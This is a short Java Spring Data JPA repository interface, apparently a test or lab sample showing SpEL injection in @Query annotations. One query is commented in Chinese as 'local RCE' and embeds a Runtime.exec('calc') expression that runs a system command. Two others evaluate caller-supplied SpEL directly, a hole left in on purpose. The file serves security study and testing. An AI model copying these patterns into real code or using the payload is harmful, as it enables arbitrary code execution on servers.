package com.test.repo;

import com.test.pojo.User;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.stereotype.Repository;

import java.util.List;

@Repository
public interface CurdRepository extends JpaRepository<User, Integer> {
    // 正常语句
    @Query(value="select * from user", nativeQuery=true)
    List<User> findAll();

//    本地RCE
    @Query(value="select * from user where id = ?#{T(Runtime).getRuntime().exec('calc')}", nativeQuery=true)
    List<User> getById(Integer id);

//    @Query(value="select u from User u where u.lastname like %:#{[0]}% and u.lastname like %:lastname%", nativeQuery=true)
    @Query(value="?#{?0}", nativeQuery=true)
    List<User> getByName(@Param("lastname") String name);

    @Query(value="?#{#entityName}", nativeQuery=true)
    List<User> get();
}
